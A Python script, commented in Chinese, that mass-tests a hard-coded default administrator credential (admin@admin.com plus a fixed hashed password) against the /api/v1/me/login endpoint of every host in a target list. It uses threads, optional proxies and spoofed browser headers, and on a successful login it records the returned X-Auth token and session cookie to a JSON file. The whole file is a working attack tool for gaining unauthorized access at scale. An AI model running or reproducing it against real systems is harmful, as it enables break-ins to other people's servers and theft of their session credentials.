import requests
import json
import time
import threading
import queue
import argparse
import sys

class BatchLoginTester:
    def __init__(self):
        self.results = []
        self.success_count = 0
        self.fail_count = 0
        
    def parse_targets(self, target_file):
        """从TXT文件解析目标"""
        targets = []
        try:
            with open(target_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        targets.append(line)
        except FileNotFoundError:
            print(f"错误: 文件 {target_file} 不存在")
            return []
        return targets
    
    def test_login(self, target, proxy=None, timeout=10, ignore_ssl=True):
        """测试单个目标的登录"""
        try:
            # 确保URL有协议
            if not target.startswith(('http://', 'https://')):
                target = f'https://{target}'
            
            # 构建登录URL
            base_url = target
            if '/' not in target:
                base_url = f'{target}/'
            
            login_url = f'{base_url.rstrip("/")}/api/v1/me/login'
            
            # 代理设置
            proxies = None
            if proxy:
                proxies = {
                    'http': proxy,
                    'https': proxy
                }
            
            # 请求头
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Accept': '*/*',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Origin': base_url,
                'Referer': f'{base_url}/app/login',
                'Sec-Ch-Ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Accept-Encoding': 'gzip, deflate, br',
                'Priority': 'u=1, i',
                'Connection': 'keep-alive'
            }
            
            # 测试数据
            test_data = {
                "email": "admin@admin.com",
                "password": "3b612c75a7b5048a435fb6ec81e52ff92d6d795a8b5a9c17070f6a63c97a53b2",
                "remember_me": True
            }
            
            # 发送请求
            start_time = time.time()
            response = requests.post(
                login_url,
                json=test_data,
                headers=headers,
                proxies=proxies,
                verify=not ignore_ssl,
                timeout=timeout
            )
            end_time = time.time()
            
            # 记录结果
            result = {
                'target': target,
                'status_code': response.status_code,
                'response_time': round(end_time - start_time, 3),
                'success': False,
                'error': None,
                'proxy': proxy or 'None'
            }
            
            # 判断登录是否成功
            if response.status_code == 204:
                result['success'] = True
                result['message'] = '登录成功'
                # 提取认证信息
                if 'X-Auth' in response.headers:
                    result['auth_token'] = response.headers['X-Auth']
                if 'Set-Cookie' in response.headers:
                    result['session_cookie'] = response.headers['Set-Cookie']
            elif response.status_code == 401:
                result['success'] = False
                result['message'] = '登录失败 - 认证失败'
            else:
                result['success'] = False
                result['message'] = f'登录失败 - HTTP {response.status_code}'
                result['error'] = response.text[:200]  # 只记录前200个字符
            
            return result
            
        except requests.exceptions.SSLError as e:
            return {
                'target': target,
                'status_code': None,
                'response_time': 0,
                'success': False,
                'error': f'SSL错误: {str(e)}',
                'proxy': proxy or 'None'
            }
        except requests.exceptions.Timeout as e:
            return {
                'target': target,
                'status_code': None,
                'response_time': timeout,
                'success': False,
                'error': f'超时: {str(e)}',
                'proxy': proxy or 'None'
            }
        except requests.exceptions.RequestException as e:
            return {
                'target': target,
                'status_code': None,
                'response_time': 0,
                'success': False,
                'error': f'请求错误: {str(e)}',
                'proxy': proxy or 'None'
            }
    
    def worker(self, task_queue, results_queue, proxy, timeout, ignore_ssl, rate_limit):
        """工作线程函数"""
        while True:
            target = task_queue.get()
            if target is None:  # 终止信号
                break
                
            # 速率限制
            time.sleep(rate_limit)
            
            result = self.test_login(target, proxy, timeout, ignore_ssl)
            results_queue.put(result)
            task_queue.task_done()
    
    def run_batch_test(self, target_file, proxy=None, max_workers=5, timeout=10, ignore_ssl=True, rate_limit=0.1):
        """运行批量测试"""
        targets = self.parse_targets(target_file)
        if not targets:
            print("没有找到有效的目标")
            return
        
        print(f"开始测试 {len(targets)} 个目标...")
        print(f"代理: {proxy or '无'}")
        print(f"并发数: {max_workers}")
        print(f"超时: {timeout}秒")
        print(f"忽略SSL: {'是' if ignore_ssl else '否'}")
        print(f"速率限制: {rate_limit}秒/请求")
        print("-" * 80)
        
        # 创建队列
        task_queue = queue.Queue()
        results_queue = queue.Queue()
        
        # 填充任务队列
        for target in targets:
            task_queue.put(target)
        
        # 启动工作线程
        threads = []
        for _ in range(max_workers):
            thread = threading.Thread(
                target=self.worker,
                args=(task_queue, results_queue, proxy, timeout, ignore_ssl, rate_limit)
            )
            thread.start()
            threads.append(thread)
        
        # 等待所有任务完成
        task_queue.join()
        
        # 发送终止信号
        for _ in range(max_workers):
            task_queue.put(None)
        
        # 等待所有线程结束
        for thread in threads:
            thread.join()
        
        # 收集结果
        while not results_queue.empty():
            result = results_queue.get()
            self.results.append(result)
            
            # 实时显示结果
            if result['success']:
                self.success_count += 1
                print(f"✅ {result['target']} - {result['message']} ({result['response_time']}s)")
            else:
                self.fail_count += 1
                print(f"❌ {result['target']} - {result['message']} ({result['response_time']}s)")
        
        # 输出统计信息
        print("-" * 80)
        print(f"测试完成: 成功 {self.success_count}, 失败 {self.fail_count}, 总计 {len(self.results)}")
        
        # 保存结果到文件
        self.save_results()
    
    def save_results(self):
        """保存结果到文件"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"login_test_results_{timestamp}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        print(f"结果已保存到: {filename}")
    
    def print_summary(self):
        """打印摘要信息"""
        print("\n=== 测试摘要 ===")
        for result in self.results:
            status = "成功" if result['success'] else "失败"
            print(f"{result['target']} - {status} - {result['message']}")

def main():
    parser = argparse.ArgumentParser(description='批量登录检测工具')
    parser.add_argument('-t', '--targets', required=True, help='目标文件路径')
    parser.add_argument('-p', '--proxy', help='代理地址 (例如: http://127.0.0.1:8080)')
    parser.add_argument('-w', '--workers', type=int, default=5, help='并发数 (默认: 5)')
    parser.add_argument('-to', '--timeout', type=int, default=10, help='超时时间(秒) (默认: 10)')
    parser.add_argument('--ssl', action='store_true', help='忽略SSL证书验证')
    parser.add_argument('-r', '--rate', type=float, default=0.1, help='请求间隔(秒) (默认: 0.1)')
    parser.add_argument('--summary', action='store_true', help='显示详细摘要')
    
    args = parser.parse_args()
    
    tester = BatchLoginTester()
    tester.run_batch_test(
        target_file=args.targets,
        proxy=args.proxy,
        max_workers=args.workers,
        timeout=args.timeout,
        ignore_ssl=args.ssl,
        rate_limit=args.rate
    )
    
    if args.summary:
        tester.print_summary()

if __name__ == "__main__":
    main()
